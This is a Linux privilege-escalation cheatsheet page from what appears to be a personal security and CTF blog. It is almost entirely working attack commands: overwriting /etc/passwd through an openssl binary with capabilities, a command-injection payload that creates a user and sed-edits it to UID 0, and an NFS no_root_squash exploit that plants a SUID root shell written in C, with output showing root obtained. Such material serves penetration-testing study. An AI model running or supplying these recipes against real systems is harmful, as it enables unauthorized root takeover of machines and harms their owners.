<head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Linux</title><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></head><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
|
<a href=https://ceso.github.io/whoami/><b>Whoami</b></a>
|
<a href=https://ceso.github.io/posts/><b>Posts</b></a>
|
<a href=https://ceso.github.io/cheatsheets/><b>Cheatsheets</b></a>
|
<a href=https://ceso.github.io/resources><b>Resources</b></a>
|
<a href=https://ceso.github.io/videos><b>Videos</b></a>
|
<a href=https://ceso.github.io/categories/><b>Categories</b></a>
|
<a href=https://ceso.github.io/tags/><b>Tags</b></a>
|
<a href=https://ceso.github.io/index.xml><b>RSS</b></a></nav><hr></header><div class=wrap><nav class=sidebar aria-label="Table of contents"><h2>Cheatsheets</h2><details><summary>Linux</summary><div class=children><a href=https://ceso.github.io/cheatsheets/linux/bash/>Bash
</a><a href=https://ceso.github.io/cheatsheets/linux/coreos/>CoreOS
</a><a href=https://ceso.github.io/cheatsheets/linux/general/>General
</a><a href=https://ceso.github.io/cheatsheets/linux/performance/>Performance</a></div></details><details open><summary>Hacking</summary><div class=children><details><summary>Active Directory</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/>BloodHound
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/>Exploitation
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/>Permissions: ACE/SDDL - Format
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/>PowerView - methods for enumeration</a></div></details><details><summary>Antivirus Bypassing</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/readme/>README !
</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/amsi/>AMSI
</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/signature_heuristics/>Signature/Heuristics</a></div></details><details><summary>Enumeration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/>Login through CIFS/WinRM/PSSession
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/networking/>Networking
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/samba/>Samba
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/>Useful Wordlists
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/>Web directorie/file scanner
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/windows/>Windows</a></div></details><details><summary>Exfiltration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/ftp/>FTP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/http/>HTTP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/rdp/>RDP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/samba/>Samba
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/sockets/>Sockets</a></div></details><details><summary>Good to know</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/>Compiling
</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/>Misc
</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/web/>Web</a></div></details><details><summary>Memory Exploitation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/memory_exploitation/simple_buffer_overflow/>(Simple) Buffer Overflow (32 bits, NO ASLR and NO DEP)</a></div></details><details><summary>Pivoting</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/readme/>README !
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/chisel/>Chisel
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/metasploit/>Metasploit
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/>sshuttle</a></div></details><details open><summary>Privilege Escalation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/ class=current>Linux
</a><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/>Windows</a></div></details><details><summary>Reverse Shells</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/>Bash
</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/>Metasploit
</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr style="border:none;border-top:1px solid rgba(255,255,255,3%);margin:12px 0"><div style=padding:8px;color:#9aa4b2;font-size:13px>I wuv cheese :D</div></nav><main><header class=page-title><h1>Linux</h1></header><article><h1 id=homeuseropenssl-ep-empty-capabilities>/home/user/openssl =ep (empty capabilities)</h1><p>Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>cp /etc/passwd /tmp/passwd.orig
</span></span><span style=display:flex><span>cp /etc/passwd /tmp/passwd.custom
</span></span></code></pre></div><p>Now, a custom user will be created and added to <code>/tmp/passwd.custom</code> with <code>customPassword</code> and as root user (UID = GID = 0):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>echo &#39;ceso:&#39;&#34;$( openssl passwd -6 -salt xyz customPassword )&#34;&#39;:0:0::/tmp:/bin/bash&#39; &gt;&gt; /tmp/passwd.custom
</span></span></code></pre></div><p>Now, create a custom <code>key.pem</code> and <code>cert.pem</code> with openssl:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
</span></span></code></pre></div><p>Encrypt the new custom passwd:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
</span></span></code></pre></div><p>Now, decrypt the custom passwd overwritting in the process the real one (<code>/etc/passwd</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>cd /
</span></span><span style=display:flex><span>/home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
</span></span></code></pre></div><p>And finally, just login with the user created with root privileges by using <code>customPassword</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>su - ceso
</span></span></code></pre></div><hr><h1 id=command-web-injection-add-user>Command web injection: add user</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed &#39;s/:4242:0:/:0:0:/&#39; /etc/passwd -i
</span></span></code></pre></div><hr><h1 id=nfs-no_root_squashinsecurerw>NFS; no_root_squash,insecure,rw</h1><p>If <code>/etc/exports</code> has a line like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/srv/pelota 192.168.42.0/24(insecure,rw)
</span></span><span style=display:flex><span>/srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
</span></span></code></pre></div><p>NFS is being exported and you and you have ssh access to the machine.
From your attacker machine <strong>while logged as root</strong> user run:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
</span></span><span style=display:flex><span>mount -t nfs 127.0.0.1:/srv/pelota my_share
</span></span><span style=display:flex><span>cd my_share
</span></span><span style=display:flex><span>cat &gt; shell.c&lt;&lt;EOF
</span></span><span style=display:flex><span>#include &lt;unistd.h&gt;
</span></span><span style=display:flex><span>int main(){
</span></span><span style=display:flex><span>  setuid(0);
</span></span><span style=display:flex><span>  setgid(0);
</span></span><span style=display:flex><span>  system(&#34;/bin/bash&#34;);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>EOF
</span></span><span style=display:flex><span>gcc shell.c -o shell
</span></span><span style=display:flex><span>chmod u+s shell
</span></span></code></pre></div><p>Now from inside a SSH session on the victim machine (in this example <code>192.168.42.32</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>bash-4.2$ cd /srv/pelota
</span></span><span style=display:flex><span>bash-4.2$ ./shell
</span></span><span style=display:flex><span>bash-4.2# id
</span></span><span style=display:flex><span>uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span></code></pre></div><hr></article></main></div></body><footer><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></footer><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank>GitHub</a>
|
<a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
|
<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright Â© 2025
<a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
<a href=http://www.gohugo.io/>Hugo</a> by ceso,
using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
<a href=https://github.com/joe-mccarthy/smigle-lite>smigle-lite</a>. Based on the theme
<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>,
which was influenced by the theme
<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer>